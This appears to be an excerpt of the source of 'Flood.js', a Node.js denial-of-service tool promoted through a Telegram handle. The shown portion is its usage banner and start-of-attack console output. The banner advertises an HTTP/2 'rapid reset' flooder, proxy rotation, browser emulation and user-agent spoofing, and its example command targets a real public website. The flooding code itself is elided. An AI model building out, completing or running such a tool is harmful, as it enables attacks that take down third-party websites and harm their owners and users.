...
if (process.argv.length < 7) {
    ...
    console.log('')
    console.log(colors.cyan("                                       t.me/rielc2"));
    console.log(`
    ${`${'v1.0 Flood'.underline} | advanced debugging, user-agent options,
                      built-in synchronised proxy checker, browser emulator, rapidreset flooder.`.italic}

    ${'Usage:'.bold.underline}

        ${`xvfb-run node Flood.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'xvfb-run node Flood.js https://google.com 60 3 90 proxies.txt --debug true --proxy 1'.italic}
...
if (cluster.isMaster) {
    ...
    console.clear();
    console.log(`\n         ${'START ATTACK'.red.bold} ${'|'.bold} ${'Website base '.bold}`);
    console.log('')
    console.log(`
            ${'METHOD'.bold}      ${'-'.red}   ${'['.red} ${`Flood`.italic} ${']'.red} 
